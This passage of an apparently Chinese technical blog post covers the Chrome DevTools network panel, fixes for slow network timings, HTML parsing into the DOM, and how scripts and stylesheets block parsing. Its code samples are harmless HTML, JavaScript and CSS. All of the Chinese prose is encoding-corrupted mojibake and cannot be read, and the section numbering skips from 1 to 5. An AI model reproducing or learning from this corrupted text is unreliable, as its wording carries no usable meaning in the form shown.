src="https://i.loli.net/2021/06/14/VRJ3q27IDnONWwS.jpg" alt="Snipaste_2021-06-14_19-12-16.jpg"></p><h2 id="ç½‘ç»œé¢æ¿"><a href="#ç½‘ç»œé¢æ¿" class="headerlink" title="ç½‘ç»œé¢æ¿"></a>ç½‘ç»œé¢æ¿</h2><p>ç½‘ç»œé¢æ¿ç”±æ§åˆ¶å™¨ã€è¿‡æ»¤å™¨ã€æŠ“å›¾ä¿¡æ¯ã€æ—¶é—´çº¿ã€è¯¦ç»†åˆ—è¡¨å’Œä¸‹è½½ä¿¡æ¯æ¦‚è¦è¿™ 6 ä¸ªåŒºåŸŸæ„æˆï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰ã€‚</p><p><img src="https://i.loli.net/2021/06/14/uU3TBk5xjIsON8w.jpg" alt="Snipaste_2021-06-14_19-13-14.jpg"></p><h3 id="1-æ§åˆ¶å™¨"><a href="#1-æ§åˆ¶å™¨" class="headerlink" title="1. æ§åˆ¶å™¨"></a>1. æ§åˆ¶å™¨</h3><p>æ§åˆ¶å™¨æœ‰ 4 ä¸ªæ¯”è¾ƒé‡è¦çš„åŠŸèƒ½ï¼š</p><p><img src="https://i.loli.net/2021/06/14/jb7PFsvDVniABEk.jpg" alt="Snipaste_2021-06-14_19-13-54.jpg"></p><ul><li>çº¢è‰²åœ†ç‚¹çš„æŒ‰é’®ï¼Œè¡¨ç¤ºâ€œå¼€å§‹ / æš‚åœæŠ“åŒ…â€ï¼Œè¿™ä¸ªåŠŸèƒ½å¾ˆå¸¸è§ï¼Œå¾ˆå®¹æ˜“ç†è§£ã€‚</li><li>â€œå…¨å±€æœç´¢â€æŒ‰é’®ï¼Œè¿™ä¸ªåŠŸèƒ½å°±éå¸¸é‡è¦äº†ï¼Œå¯ä»¥åœ¨æ‰€æœ‰ä¸‹è½½èµ„æºä¸­æœç´¢ç›¸å…³å†…å®¹ï¼Œè¿˜å¯ä»¥å¿«é€Ÿå®šä½åˆ°æŸå‡ ä¸ªä½ æƒ³è¦çš„æ–‡ä»¶ä¸Šã€‚</li><li>Disable cacheï¼Œå³â€œç¦æ­¢ä» Cache ä¸­åŠ è½½èµ„æºâ€çš„åŠŸèƒ½ï¼Œå®ƒåœ¨è°ƒè¯• Web åº”ç”¨çš„æ—¶å€™éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå¼€å¯äº† Cache ä¼šå½±å“åˆ°ç½‘ç»œæ€§èƒ½æµ‹è¯•çš„ç»“æœã€‚</li><li>Online æŒ‰é’®ï¼Œæ˜¯â€œæ¨¡æ‹Ÿ 2G/3Gâ€åŠŸèƒ½ï¼Œå®ƒå¯ä»¥é™åˆ¶å¸¦å®½ï¼Œæ¨¡æ‹Ÿå¼±ç½‘æƒ…å†µä¸‹é¡µé¢çš„å±•ç°æƒ…å†µï¼Œç„¶åä½ å°±å¯ä»¥æ ¹æ®å®é™…å±•ç¤ºæƒ…å†µæ¥åŠ¨æ€è°ƒæ•´ç­–ç•¥ï¼Œä»¥ä¾¿è®© Web åº”ç”¨æ›´åŠ é€‚ç”¨äºè¿™äº›å¼±ç½‘ã€‚</li></ul><h3 id="5-è¯¦ç»†åˆ—è¡¨"><a href="#5-è¯¦ç»†åˆ—è¡¨" class="headerlink" title="5. è¯¦ç»†åˆ—è¡¨"></a>5. è¯¦ç»†åˆ—è¡¨</h3><p>å¯ä»¥æŒ‰ç…§åˆ—è¡¨çš„å±æ€§æ¥ç»™åˆ—è¡¨æ’åºï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œåˆ—è¡¨æ˜¯æŒ‰è¯·æ±‚å‘èµ·çš„æ—¶é—´æ¥æ’åºçš„ï¼Œæœ€æ—©å‘èµ·è¯·æ±‚çš„èµ„æºåœ¨é¡¶éƒ¨ã€‚å½“ç„¶ä¹Ÿå¯ä»¥æŒ‰ç…§è¿”å›çŠ¶æ€ç ã€è¯·æ±‚ç±»å‹ã€è¯·æ±‚æ—¶é•¿ã€å†…å®¹å¤§å°ç­‰åŸºç¡€å±æ€§æ’åºï¼Œåªéœ€ç‚¹å‡»ç›¸åº”å±æ€§å³å¯ã€‚</p><h3 id="ä¼˜åŒ–æ—¶é—´çº¿ä¸Šè€—æ—¶é¡¹"><a href="#ä¼˜åŒ–æ—¶é—´çº¿ä¸Šè€—æ—¶é¡¹" class="headerlink" title="ä¼˜åŒ–æ—¶é—´çº¿ä¸Šè€—æ—¶é¡¹"></a>ä¼˜åŒ–æ—¶é—´çº¿ä¸Šè€—æ—¶é¡¹</h3><h4 id="1-æ’é˜Ÿï¼ˆQueuingï¼‰æ—¶é—´è¿‡ä¹…"><a href="#1-æ’é˜Ÿï¼ˆQueuingï¼‰æ—¶é—´è¿‡ä¹…" class="headerlink" title="1. æ’é˜Ÿï¼ˆQueuingï¼‰æ—¶é—´è¿‡ä¹…"></a>1. æ’é˜Ÿï¼ˆQueuingï¼‰æ—¶é—´è¿‡ä¹…</h4><p>æ’é˜Ÿæ—¶é—´è¿‡ä¹…ï¼Œå¤§æ¦‚ç‡æ˜¯ç”±æµè§ˆå™¨ä¸ºæ¯ä¸ªåŸŸåæœ€å¤šç»´æŠ¤ 6 ä¸ªè¿æ¥å¯¼è‡´çš„ã€‚é‚£ä¹ˆåŸºäºè¿™ä¸ªåŸå› ï¼Œå¯ä»¥è®© 1 ä¸ªç«™ç‚¹ä¸‹é¢çš„èµ„æºæ”¾åœ¨å¤šä¸ªåŸŸåä¸‹é¢ï¼Œæ¯”å¦‚æ”¾åˆ° 3 ä¸ªåŸŸåä¸‹é¢ï¼Œè¿™æ ·å°±å¯ä»¥åŒæ—¶æ”¯æŒ 18 ä¸ªè¿æ¥äº†ï¼Œè¿™ç§æ–¹æ¡ˆç§°ä¸º<strong>åŸŸååˆ†ç‰‡</strong>æŠ€æœ¯ã€‚é™¤äº†åŸŸååˆ†ç‰‡æŠ€æœ¯å¤–ï¼Œè¿˜å¯ä»¥<strong>æŠŠç«™ç‚¹å‡çº§åˆ° HTTP2</strong>ï¼Œå› ä¸º HTTP2 å·²ç»æ²¡æœ‰æ¯ä¸ªåŸŸåæœ€å¤šç»´æŠ¤ 6 ä¸ª TCP è¿æ¥çš„é™åˆ¶äº†ã€‚</p><h4 id="2-ç¬¬ä¸€å­—èŠ‚æ—¶é—´ï¼ˆTTFBï¼‰æ—¶é—´è¿‡ä¹…"><a href="#2-ç¬¬ä¸€å­—èŠ‚æ—¶é—´ï¼ˆTTFBï¼‰æ—¶é—´è¿‡ä¹…" class="headerlink" title="2. ç¬¬ä¸€å­—èŠ‚æ—¶é—´ï¼ˆTTFBï¼‰æ—¶é—´è¿‡ä¹…"></a>2. ç¬¬ä¸€å­—èŠ‚æ—¶é—´ï¼ˆTTFBï¼‰æ—¶é—´è¿‡ä¹…</h4><p>è¿™å¯èƒ½çš„åŸå› æœ‰å¦‚ä¸‹ï¼š</p><ul><li><strong>æœåŠ¡å™¨ç”Ÿæˆé¡µé¢æ•°æ®çš„æ—¶é—´è¿‡ä¹…</strong>ã€‚å¯¹äºåŠ¨æ€ç½‘é¡µæ¥è¯´ï¼ŒæœåŠ¡å™¨æ”¶åˆ°ç”¨æˆ·æ‰“å¼€ä¸€ä¸ªé¡µé¢çš„è¯·æ±‚æ—¶ï¼Œé¦–å…ˆè¦ä»æ•°æ®åº“ä¸­è¯»å–è¯¥é¡µé¢éœ€è¦çš„æ•°æ®ï¼Œç„¶åæŠŠè¿™äº›æ•°æ®ä¼ å…¥åˆ°æ¨¡æ¿ä¸­ï¼Œæ¨¡æ¿æ¸²æŸ“åï¼Œå†è¿”å›ç»™ç”¨æˆ·ã€‚æœåŠ¡å™¨åœ¨å¤„ç†è¿™ä¸ªæ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½æŸä¸ªç¯èŠ‚ä¼šå‡ºé—®é¢˜ã€‚</li><li><strong>ç½‘ç»œçš„åŸå› </strong>ã€‚æ¯”å¦‚ä½¿ç”¨äº†ä½å¸¦å®½çš„æœåŠ¡å™¨ï¼Œæˆ–è€…æœ¬æ¥ç”¨çš„æ˜¯ç”µä¿¡çš„æœåŠ¡å™¨ï¼Œå¯è”é€šçš„ç½‘ç»œç”¨æˆ·è¦æ¥è®¿é—®æœåŠ¡å™¨ï¼Œè¿™æ ·ä¹Ÿä¼šæ‹–æ…¢ç½‘é€Ÿã€‚</li><li><strong>å‘é€è¯·æ±‚å¤´æ—¶å¸¦ä¸Šäº†å¤šä½™çš„ç”¨æˆ·ä¿¡æ¯</strong>ã€‚æ¯”å¦‚ä¸€äº›ä¸å¿…è¦çš„ Cookie ä¿¡æ¯ï¼ŒæœåŠ¡å™¨æ¥æ”¶åˆ°è¿™äº› Cookie ä¿¡æ¯ä¹‹åå¯èƒ½éœ€è¦å¯¹æ¯ä¸€é¡¹éƒ½åšå¤„ç†ï¼Œè¿™æ ·å°±åŠ å¤§äº†æœåŠ¡å™¨çš„å¤„ç†æ—¶é•¿ã€‚</li></ul><p>é¢å¯¹ç¬¬ä¸€ç§æœåŠ¡å™¨çš„é—®é¢˜ï¼Œå¯ä»¥é€šè¿‡å¢åŠ å„ç§ç¼“å­˜çš„æŠ€æœ¯ï¼›é’ˆå¯¹ç¬¬äºŒç§ç½‘ç»œé—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨ CDN æ¥ç¼“å­˜ä¸€äº›é™æ€æ–‡ä»¶ï¼›è‡³äºç¬¬ä¸‰ç§ï¼Œåœ¨å‘é€è¯·æ±‚æ—¶å°±å»å°½å¯èƒ½åœ°å‡å°‘ä¸€äº›ä¸å¿…è¦çš„ Cookie æ•°æ®ä¿¡æ¯ã€‚</p><h4 id="3-Content-Download-æ—¶é—´è¿‡ä¹…"><a href="#3-Content-Download-æ—¶é—´è¿‡ä¹…" class="headerlink" title="3. Content Download æ—¶é—´è¿‡ä¹…"></a>3. Content Download æ—¶é—´è¿‡ä¹…</h4><p>å¦‚æœå•ä¸ªè¯·æ±‚çš„ Content Download èŠ±è´¹äº†å¤§é‡æ—¶é—´ï¼Œæœ‰å¯èƒ½æ˜¯å­—èŠ‚æ•°å¤ªå¤šçš„åŸå› å¯¼è‡´çš„ã€‚è¿™æ—¶å€™éœ€è¦å‡å°‘æ–‡ä»¶å¤§å°ï¼Œæ¯”å¦‚å‹ç¼©ã€å»æ‰æºç ä¸­ä¸å¿…è¦çš„æ³¨é‡Šç­‰æ–¹æ³•ã€‚</p><h2 id="DOM-æ ‘"><a href="#DOM-æ ‘" class="headerlink" title="DOM æ ‘"></a><strong>DOM æ ‘</strong></h2><h3 id="ä»€ä¹ˆæ˜¯-DOM"><a href="#ä»€ä¹ˆæ˜¯-DOM" class="headerlink" title="ä»€ä¹ˆæ˜¯ DOM"></a>ä»€ä¹ˆæ˜¯ DOM</h3><p>ä»ç½‘ç»œä¼ ç»™æ¸²æŸ“å¼•æ“çš„ HTML æ–‡ä»¶å­—èŠ‚æµæ˜¯æ— æ³•ç›´æ¥è¢«æ¸²æŸ“å¼•æ“ç†è§£çš„ï¼Œæ‰€ä»¥è¦å°†å…¶è½¬åŒ–ä¸ºæ¸²æŸ“å¼•æ“èƒ½å¤Ÿç†è§£çš„å†…éƒ¨ç»“æ„ï¼Œè¿™ä¸ªç»“æ„å°±æ˜¯ DOMã€‚DOM æä¾›äº†å¯¹ HTML æ–‡æ¡£ç»“æ„åŒ–çš„è¡¨è¿°ã€‚åœ¨æ¸²æŸ“å¼•æ“ä¸­ï¼ŒDOM æœ‰ä¸‰ä¸ªå±‚é¢çš„ä½œç”¨ã€‚</p><ul><li>ä»é¡µé¢çš„è§†è§’æ¥çœ‹ï¼ŒDOM æ˜¯ç”Ÿæˆé¡µé¢çš„åŸºç¡€æ•°æ®ç»“æ„ã€‚</li><li>ä» JavaScript è„šæœ¬è§†è§’æ¥çœ‹ï¼ŒDOM æä¾›ç»™ JavaScript è„šæœ¬æ“ä½œçš„æ¥å£ï¼Œé€šè¿‡è¿™å¥—æ¥å£ï¼ŒJavaScript å¯ä»¥å¯¹ DOM ç»“æ„è¿›è¡Œè®¿é—®ï¼Œä»è€Œæ”¹å˜æ–‡æ¡£çš„ç»“æ„ã€æ ·å¼å’Œå†…å®¹ã€‚</li><li>ä»å®‰å…¨è§†è§’æ¥çœ‹ï¼ŒDOM æ˜¯ä¸€é“å®‰å…¨é˜²æŠ¤çº¿ï¼Œä¸€äº›ä¸å®‰å…¨çš„å†…å®¹åœ¨ DOM è§£æé˜¶æ®µå°±è¢«æ‹’ä¹‹é—¨å¤–äº†ã€‚</li></ul><p>ç®€è¨€ä¹‹ï¼ŒDOM æ˜¯è¡¨è¿° HTML çš„å†…éƒ¨æ•°æ®ç»“æ„ï¼Œå®ƒä¼šå°† Web é¡µé¢å’Œ JavaScript è„šæœ¬è¿æ¥èµ·æ¥ï¼Œå¹¶è¿‡æ»¤ä¸€äº›ä¸å®‰å…¨çš„å†…å®¹ã€‚</p><h3 id="DOM-æ ‘å¦‚ä½•ç”Ÿæˆ"><a href="#DOM-æ ‘å¦‚ä½•ç”Ÿæˆ" class="headerlink" title="DOM æ ‘å¦‚ä½•ç”Ÿæˆ"></a>DOM æ ‘å¦‚ä½•ç”Ÿæˆ</h3><p>åœ¨æ¸²æŸ“å¼•æ“å†…éƒ¨ï¼Œæœ‰ä¸€ä¸ªå«<strong>HTML è§£æå™¨ï¼ˆHTMLParserï¼‰</strong>çš„æ¨¡å—ï¼Œå®ƒè´Ÿè´£å°† HTML å­—èŠ‚æµè½¬æ¢ä¸º DOM ç»“æ„ã€‚</p><p><strong>ç½‘ç»œè¿›ç¨‹åŠ è½½äº†å¤šå°‘æ•°æ®ï¼ŒHTML è§£æå™¨ä¾¿è§£æå¤šå°‘æ•°æ®</strong>ï¼š</p><ol><li>ç½‘ç»œè¿›ç¨‹æ¥æ”¶åˆ°å“åº”å¤´ä¹‹åï¼Œä¼šæ ¹æ®å“åº”å¤´ä¸­çš„ content-type å­—æ®µæ¥åˆ¤æ–­æ–‡ä»¶çš„ç±»å‹ï¼Œæ¯”å¦‚ content-type çš„å€¼æ˜¯â€œtext/htmlâ€ï¼Œé‚£ä¹ˆæµè§ˆå™¨å°±ä¼šåˆ¤æ–­è¿™æ˜¯ä¸€ä¸ª HTML ç±»å‹çš„æ–‡ä»¶ï¼Œç„¶åä¸ºè¯¥è¯·æ±‚é€‰æ‹©æˆ–è€…åˆ›å»ºä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ã€‚</li><li>æ¸²æŸ“è¿›ç¨‹å‡†å¤‡å¥½ä¹‹åï¼Œ<strong>ç½‘ç»œè¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹ä¹‹é—´ä¼šå»ºç«‹ä¸€ä¸ªå…±äº«æ•°æ®çš„ç®¡é“</strong>ï¼Œç½‘ç»œè¿›ç¨‹æ¥æ”¶åˆ°æ•°æ®åå°±å¾€è¿™ä¸ªç®¡é“é‡Œé¢æ”¾ï¼Œè€Œæ¸²æŸ“è¿›ç¨‹åˆ™ä»ç®¡é“çš„å¦å¤–ä¸€ç«¯ä¸æ–­åœ°è¯»å–æ•°æ®ï¼Œå¹¶åŒæ—¶å°†è¯»å–çš„æ•°æ®â€œå–‚â€ç»™ HTML è§£æå™¨ã€‚</li></ol><p>ä½ å¯ä»¥æŠŠè¿™ä¸ªç®¡é“æƒ³è±¡æˆä¸€ä¸ªâ€œæ°´ç®¡â€ï¼Œç½‘ç»œè¿›ç¨‹æ¥æ”¶åˆ°çš„å­—èŠ‚æµåƒæ°´ä¸€æ ·å€’è¿›è¿™ä¸ªâ€œæ°´ç®¡â€ï¼Œè€Œâ€œæ°´ç®¡â€çš„å¦å¤–ä¸€ç«¯æ˜¯æ¸²æŸ“è¿›ç¨‹çš„ HTML è§£æå™¨ï¼Œå®ƒä¼šåŠ¨æ€æ¥æ”¶å­—èŠ‚æµï¼Œå¹¶å°†å…¶è§£æä¸º DOMã€‚</p><p><img src="https://i.loli.net/2021/06/14/5GoDOckhsQNtfWT.jpg" alt="Snipaste_2021-06-14_19-33-34.jpg"></p><p><strong>ç¬¬ä¸€ä¸ªé˜¶æ®µï¼Œé€šè¿‡åˆ†è¯å™¨å°†å­—èŠ‚æµè½¬æ¢ä¸º Tokenã€‚</strong>ä¸Šè¿° HTML ä»£ç é€šè¿‡è¯æ³•åˆ†æç”Ÿæˆçš„ Token å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/06/14/ugL51BlF6qTsrUO.jpg" alt="Snipaste_2021-06-14_19-34-25.jpg"></p><p><strong>åç»­çš„ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªé˜¶æ®µæ˜¯åŒæ­¥è¿›è¡Œçš„ï¼Œéœ€è¦å°† Token è§£æä¸º DOM èŠ‚ç‚¹ï¼Œå¹¶å°† DOM èŠ‚ç‚¹æ·»åŠ åˆ° DOM æ ‘ä¸­ã€‚</strong></p><p>HTML è§£æå™¨ç»´æŠ¤äº†ä¸€ä¸ª<strong>Token æ ˆç»“æ„</strong>ï¼Œè¯¥ Token æ ˆä¸»è¦ç”¨æ¥è®¡ç®—èŠ‚ç‚¹ä¹‹é—´çš„çˆ¶å­å…³ç³»ï¼Œåœ¨ç¬¬ä¸€ä¸ªé˜¶æ®µä¸­ç”Ÿæˆçš„ Token ä¼šè¢«æŒ‰ç…§é¡ºåºå‹åˆ°è¿™ä¸ªæ ˆä¸­ã€‚å…·ä½“çš„å¤„ç†è§„åˆ™å¦‚ä¸‹æ‰€ç¤ºï¼š</p><ul><li>å¦‚æœå‹å…¥åˆ°æ ˆä¸­çš„æ˜¯<strong>StartTag Token</strong>ï¼ŒHTML è§£æå™¨ä¼šä¸ºè¯¥ Token åˆ›å»ºä¸€ä¸ª DOM èŠ‚ç‚¹ï¼Œç„¶åå°†è¯¥èŠ‚ç‚¹åŠ å…¥åˆ° DOM æ ‘ä¸­ï¼Œå®ƒçš„çˆ¶èŠ‚ç‚¹å°±æ˜¯æ ˆä¸­ç›¸é‚»çš„é‚£ä¸ªå…ƒç´ ç”Ÿæˆçš„èŠ‚ç‚¹ã€‚</li><li>å¦‚æœåˆ†è¯å™¨è§£æå‡ºæ¥æ˜¯<strong>æ–‡æœ¬ Token</strong>ï¼Œé‚£ä¹ˆä¼šç”Ÿæˆä¸€ä¸ªæ–‡æœ¬èŠ‚ç‚¹ï¼Œç„¶åå°†è¯¥èŠ‚ç‚¹åŠ å…¥åˆ° DOM æ ‘ä¸­ï¼Œæ–‡æœ¬ Token æ˜¯ä¸éœ€è¦å‹å…¥åˆ°æ ˆä¸­ï¼Œå®ƒçš„çˆ¶èŠ‚ç‚¹å°±æ˜¯å½“å‰æ ˆé¡¶ Token æ‰€å¯¹åº”çš„ DOM èŠ‚ç‚¹ã€‚</li><li>å¦‚æœåˆ†è¯å™¨è§£æå‡ºæ¥çš„æ˜¯<strong>EndTag æ ‡ç­¾</strong>ï¼Œæ¯”å¦‚æ˜¯ EndTag divï¼ŒHTML è§£æå™¨ä¼šæŸ¥çœ‹ Token æ ˆé¡¶çš„å…ƒç´ æ˜¯å¦æ˜¯ StarTag divï¼Œå¦‚æœæ˜¯ï¼Œå°±å°† StartTag div ä»æ ˆä¸­å¼¹å‡ºï¼Œè¡¨ç¤ºè¯¥ div å…ƒç´ è§£æå®Œæˆã€‚</li></ul><p>è¡¥å……è¯´æ˜ï¼š<strong>HTML è§£æå™¨å¼€å§‹å·¥ä½œæ—¶ï¼Œä¼šé»˜è®¤åˆ›å»ºäº†ä¸€ä¸ªæ ¹ä¸º document çš„ç©º DOM ç»“æ„</strong>ï¼ŒåŒæ—¶ä¼šå°†ä¸€ä¸ª StartTag document çš„ Token å‹å…¥æ ˆåº•ã€‚</p><h3 id="JavaScript-æ˜¯å¦‚ä½•å½±å“-DOM-ç”Ÿæˆçš„"><a href="#JavaScript-æ˜¯å¦‚ä½•å½±å“-DOM-ç”Ÿæˆçš„" class="headerlink" title="JavaScript æ˜¯å¦‚ä½•å½±å“ DOM ç”Ÿæˆçš„"></a>JavaScript æ˜¯å¦‚ä½•å½±å“ DOM ç”Ÿæˆçš„</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> div1 = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;div&#x27;</span>)[<span class="number">0</span>]</span></span><br><span class="line"><span class="javascript">    div1.innerText = <span class="string">&#x27;time.geekbang&#x27;</span></span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨ä¸¤æ®µ div ä¸­é—´æ’å…¥äº†ä¸€æ®µ JavaScript è„šæœ¬ï¼Œè¿™æ®µè„šæœ¬çš„è§£æè¿‡ç¨‹å°±æœ‰ç‚¹ä¸ä¸€æ ·äº†ã€‚<code>æ ‡ç­¾ä¹‹å‰ï¼Œæ‰€æœ‰çš„è§£ææµç¨‹è¿˜æ˜¯å’Œä¹‹å‰ä»‹ç»çš„ä¸€æ ·ï¼Œä½†æ˜¯è§£æåˆ°</code>æ ‡ç­¾æ—¶ï¼Œæ¸²æŸ“å¼•æ“åˆ¤æ–­è¿™æ˜¯ä¸€æ®µè„šæœ¬ï¼Œæ­¤æ—¶ HTML è§£æå™¨å°±ä¼šæš‚åœ DOM çš„è§£æï¼Œå› ä¸ºæ¥ä¸‹æ¥çš„ JavaScript å¯èƒ½è¦ä¿®æ”¹å½“å‰å·²ç»ç”Ÿæˆçš„ DOM ç»“æ„ã€‚</p><p><strong>ä½†å¦‚æœåœ¨é¡µé¢ä¸­å¼•å…¥ JavaScript æ–‡ä»¶ï¼Œè¿™ä¸ªè§£æè¿‡ç¨‹å°±ç¨å¾®å¤æ‚äº†äº›ï¼š</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//foo.js</span><br><span class="line">let div1 = document.getElementsByTagName(&#x27;div&#x27;)[0]</span><br><span class="line">div1.innerText = &#x27;time.geekbang&#x27;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&#x27;foo.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåˆ° JavaScript æ ‡ç­¾æ—¶ï¼Œæš‚åœæ•´ä¸ª DOM çš„è§£æï¼Œæ‰§è¡Œ JavaScript ä»£ç ï¼Œä¸è¿‡è¿™é‡Œæ‰§è¡Œ JavaScript æ—¶ï¼Œéœ€è¦å…ˆä¸‹è½½è¿™æ®µ JavaScript ä»£ç ã€‚è¿™é‡Œéœ€è¦é‡ç‚¹å…³æ³¨ä¸‹è½½ç¯å¢ƒï¼Œå› ä¸º<strong>JavaScript æ–‡ä»¶çš„ä¸‹è½½è¿‡ç¨‹ä¼šé˜»å¡ DOM è§£æ</strong>ï¼Œè€Œé€šå¸¸ä¸‹è½½åˆæ˜¯éå¸¸è€—æ—¶çš„ï¼Œä¼šå—åˆ°ç½‘ç»œç¯å¢ƒã€JavaScript æ–‡ä»¶å¤§å°ç­‰å› ç´ çš„å½±å“ã€‚</p><p>ä¸è¿‡ Chrome æµè§ˆå™¨åšäº†å¾ˆå¤šä¼˜åŒ–ï¼Œå…¶ä¸­ä¸€ä¸ªä¸»è¦çš„ä¼˜åŒ–æ˜¯<strong>é¢„è§£ææ“ä½œ</strong>ã€‚å½“æ¸²æŸ“å¼•æ“æ”¶åˆ°å­—èŠ‚æµä¹‹åï¼Œä¼šå¼€å¯ä¸€ä¸ªé¢„è§£æçº¿ç¨‹ï¼Œç”¨æ¥åˆ†æ HTML æ–‡ä»¶ä¸­åŒ…å«çš„ JavaScriptã€CSS ç­‰ç›¸å…³æ–‡ä»¶ï¼Œè§£æåˆ°ç›¸å…³æ–‡ä»¶ä¹‹åï¼Œé¢„è§£æçº¿ç¨‹ä¼šæå‰ä¸‹è½½è¿™äº›æ–‡ä»¶ã€‚</p><p>å¼•å…¥ JavaScript çº¿ç¨‹ä¼šé˜»å¡ DOMï¼Œä¸è¿‡ä¹Ÿæœ‰ä¸€äº›ç›¸å…³çš„ç­–ç•¥æ¥è§„é¿ï¼Œæ¯”å¦‚ä½¿ç”¨ CDN æ¥åŠ é€Ÿ JavaScript æ–‡ä»¶çš„åŠ è½½ï¼Œå‹ç¼© JavaScript æ–‡ä»¶çš„ä½“ç§¯ã€‚å¦å¤–ï¼Œå¦‚æœ JavaScript æ–‡ä»¶ä¸­æ²¡æœ‰æ“ä½œ DOM ç›¸å…³ä»£ç ï¼Œå°±å¯ä»¥å°†è¯¥ JavaScript è„šæœ¬è®¾ç½®ä¸ºå¼‚æ­¥åŠ è½½ï¼Œé€šè¿‡ async æˆ– defer æ¥æ ‡è®°ä»£ç ã€‚async å’Œ defer è™½ç„¶éƒ½æ˜¯å¼‚æ­¥çš„ï¼Œä¸è¿‡è¿˜æœ‰ä¸€äº›å·®å¼‚ï¼Œä½¿ç”¨ <strong>async</strong> æ ‡å¿—çš„è„šæœ¬æ–‡ä»¶ä¸€æ—¦åŠ è½½å®Œæˆï¼Œä¼š<strong>ç«‹å³æ‰§è¡Œ</strong>ï¼›è€Œä½¿ç”¨äº† <strong>defer</strong> æ ‡è®°çš„è„šæœ¬æ–‡ä»¶ï¼Œéœ€è¦<strong>åœ¨ DOMContentLoaded äº‹ä»¶ä¹‹å‰æ‰§è¡Œ</strong>ã€‚</p><p>æ¥ç€çœ‹å¦ä¸€ç§æƒ…å†µï¼š</p><p>å¦‚æœ JavaScript ä»£ç å‡ºç°äº† <code>div1.style.color = â€˜red&#39;</code> çš„è¯­å¥ï¼Œå®ƒæ˜¯ç”¨æ¥æ“çºµ CSSOM çš„ï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œ JavaScript ä¹‹å‰ï¼Œéœ€è¦å…ˆè§£æ JavaScript è¯­å¥ä¹‹ä¸Šæ‰€æœ‰çš„ CSS æ ·å¼ã€‚æ‰€ä»¥å¦‚æœä»£ç é‡Œå¼•ç”¨äº†å¤–éƒ¨çš„ CSS æ–‡ä»¶ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œ JavaScript ä¹‹å‰ï¼Œè¿˜éœ€è¦ç­‰å¾…å¤–éƒ¨çš„ CSS æ–‡ä»¶ä¸‹è½½å®Œæˆï¼Œå¹¶è§£æç”Ÿæˆ CSSOM å¯¹è±¡ä¹‹åï¼Œæ‰èƒ½æ‰§è¡Œ JavaScript è„šæœ¬ã€‚</p><p>è€Œ JavaScript å¼•æ“åœ¨è§£æ JavaScript ä¹‹å‰ï¼Œæ˜¯ä¸çŸ¥é“ JavaScript æ˜¯å¦æ“çºµäº† CSSOM çš„ï¼Œæ‰€ä»¥æ¸²æŸ“å¼•æ“åœ¨é‡åˆ° JavaScript è„šæœ¬æ—¶ï¼Œä¸ç®¡è¯¥è„šæœ¬æ˜¯å¦æ“çºµäº† CSSOMï¼Œ<strong>éƒ½ä¼šæ‰§è¡Œ CSS æ–‡ä»¶ä¸‹è½½ã€è§£ææ“ä½œ</strong>ï¼Œå†æ‰§è¡Œ JavaScript è„šæœ¬ã€‚</p><p>æ‰€ä»¥ JavaScript è„šæœ¬æ˜¯ä¾èµ–æ ·å¼è¡¨çš„ï¼Œè¿™åˆå¤šäº†ä¸€ä¸ªé˜»å¡è¿‡ç¨‹ã€‚</p><h2 id="æ¸²æŸ“æµæ°´çº¿"><a href="#æ¸²æŸ“æµæ°´çº¿" class="headerlink" title="æ¸²æŸ“æµæ°´çº¿"></a>æ¸²æŸ“æµæ°´çº¿</h2><h3 id="æ¸²æŸ“æµæ°´çº¿è§†è§’ä¸‹çš„-CSS"><a href="#æ¸²æŸ“æµæ°´çº¿è§†è§’ä¸‹çš„-CSS" class="headerlink" title="æ¸²æŸ“æµæ°´çº¿è§†è§’ä¸‹çš„ CSS"></a>æ¸²æŸ“æµæ°´çº¿è§†è§’ä¸‹çš„ CSS</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//theme.css</span><br><span class="line">div&#123; </span><br><span class="line">    color : coral;</span><br><span class="line">    background-color:black</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    